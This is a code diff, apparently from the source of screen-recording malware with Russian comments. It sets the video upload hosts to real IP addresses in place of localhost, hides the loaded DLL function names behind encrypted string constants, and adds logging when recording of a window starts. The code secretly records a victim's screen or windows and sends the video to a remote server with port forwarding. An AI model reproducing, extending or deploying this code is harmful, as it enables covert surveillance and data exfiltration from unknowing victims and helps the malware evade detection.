@@ -9,6 +9,7 @@
 #include "Crypt.h"
 #include "Pipes.h"
 #include "Inject.h"
+#include "StrConsts.h"
 
 
 //----------------------------------------------------------------------------
@@ -43,10 +44,10 @@ namespace VIDEORECDEBUGSTRINGS
 //	char VIDEO_REC_HOST1[] = "178.162.179.65";
 //	char VIDEO_REC_HOST2[] = "188.72.202.163";
 
-	char VIDEO_REC_HOST1[] = "127.0.0.1";
-	char VIDEO_REC_HOST2[] = "127.0.0.1";
-//	char VIDEO_REC_HOST1[] = "192.168.147.2";
-//	char VIDEO_REC_HOST2[] = "193.106.161.242";
+//	char VIDEO_REC_HOST1[] = "127.0.0.1";
+//	char VIDEO_REC_HOST2[] = "127.0.0.1";
+	char VIDEO_REC_HOST1[] = "192.168.147.2";
+	char VIDEO_REC_HOST2[] = "193.106.161.242";
 #else
 	//Адрес сервера куда пишем видео
 	char VIDEO_REC_HOST1[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST1;
@@ -86,21 +87,22 @@ TVideoRecDLL::~TVideoRecDLL()
 void TVideoRecDLL::LoadFunc(LPVOID *Addr, const char* Name)
 {
 	// Функция загружает функцию библиотеки
+	// Функция расчитывает на то, что строка Name зашифрована
 	if (FHandle)
-		*Addr = MemoryGetProcAddress(FHandle, Name);
+		*Addr = MemoryGetProcAddress(FHandle, GetStr(Name).t_str());
 	else
 		*Addr = NULL;
-
 }
+//-------------------------------------------------------------------
 
 void TVideoRecDLL::InitializeApi()
 {
-	LoadFunc((LPVOID*)&RecordProcess,   "StartRecPid");
-	LoadFunc((LPVOID*)&RecordWnd,       "StartRecHwnd");
-	LoadFunc((LPVOID*)&Stop,            "StopRec");
-	LoadFunc((LPVOID*)&ResetTimer,      "ResetTimer");
-	LoadFunc((LPVOID*)&SendData,        "StartSend");
-	LoadFunc((LPVOID*)&RunPortForward,	"RunPortForward");
+	LoadFunc((LPVOID*)&RecordProcess,   VideRecFuncRecordProcess);
+	LoadFunc((LPVOID*)&RecordWnd,       VideRecFuncRecordWnd);
+	LoadFunc((LPVOID*)&Stop,            VideRecFuncStop);
+	LoadFunc((LPVOID*)&ResetTimer,      VideRecFuncResetTimer);
+	LoadFunc((LPVOID*)&SendData,        VideRecFuncSendData);
+	LoadFunc((LPVOID*)&RunPortForward,	VideRecFuncRunPortForward);
 }
 
 
@@ -155,7 +157,8 @@ void TVideoRecorder::RecordWnd(HWND Wnd)
 		{
 			// Запускается полноэкранная запись
 			Flags = VIDEO_FULLSCREEN | VIDEO_ALWAYS;
-        }
+		}
+		VDRDBG("VideoRecorder", "Запущена запись с окна %d", Wnd);
 		FDLL.RecordWnd(UID.t_str(), VideoName.t_str(), Wnd,
 					   Server.t_str(), Port,
 					   Server2.t_str(), Port2, RecordTime, Flags);
